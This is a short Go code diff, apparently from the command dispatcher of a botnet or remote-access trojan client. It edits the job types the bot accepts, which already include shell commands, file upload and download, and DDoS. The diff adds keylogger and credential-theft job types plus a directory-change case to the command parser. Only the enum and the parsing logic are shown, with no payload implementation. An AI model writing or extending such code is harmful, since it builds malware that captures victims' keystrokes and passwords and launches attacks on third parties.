@@ -20,10 +20,12 @@ const (
 	SHELL_CMD
 	UPLOAD
 	DOWNLOAD
-	DDOS
 	CHDIR
 	SLEEP
 	BOOST
+	KEYLOGGER
+	DDOS
+	CREDENTIALS
 )
 
 func parseJob(todo string) (JobType, []string) {
@@ -44,6 +46,8 @@ func parseJob(todo string) (JobType, []string) {
 		return SLEEP, jobArgs
 	} else if jobType == "boost" && jobArgsN == 1 {
 		return BOOST, jobArgs
+	} else if jobType == "chdir" && jobArgsN == 1 {
+		return CHDIR, jobArgs
 	}
 	return UNKNOWN, nil
 }
